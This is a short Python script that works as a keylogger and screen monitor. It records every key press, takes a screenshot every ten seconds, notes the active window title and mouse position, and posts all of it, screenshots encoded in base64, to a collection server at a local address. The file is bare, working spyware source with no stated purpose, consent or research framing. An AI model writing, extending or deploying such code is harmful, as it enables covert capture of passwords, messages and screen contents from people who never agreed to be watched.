from pynput import keyboard
from datetime import datetime
import threading
import pyautogui
import pygetwindow
import requests
import time
import io
import base64

def on_press(key):
    # Extract relevant information from the key press event
    key_value = str(key)
    send_info(key_info=key_value, flag = False)


def send_info(key_info=None, flag =True):
    if flag:
        screenshot = pyautogui.screenshot()
        # Save the screenshot as a file-like object
        image_stream = io.BytesIO()
        screenshot.save(image_stream, format='PNG')
        image_stream.seek(0)
        # files = {'screenshot': image_stream}
        base64_image = base64.b64encode(image_stream.getvalue()).decode('utf-8')
    else: base64_image = None
    
    active_window = pygetwindow.getActiveWindow().title
    mouse_position = pyautogui.position()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    payload = {
        "active_window": active_window,
        "mouse_position": mouse_position,
        "timestamp": current_time,
        "key_info": key_info,
        "image_data": base64_image
    }
    

    # Send the information and the screenshot file to the server
    # response = requests.post("http://127.0.0.1:8000/info", files=files, data=payload)
    response = requests.post("http://127.0.0.1:8000/info", data=payload)
    print(response.text)

def realtime_send():
    while True:
        send_info()
        time.sleep(10)  # Send information every 5 seconds

if __name__ == "__main__":
    threading.Thread(target=realtime_send).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
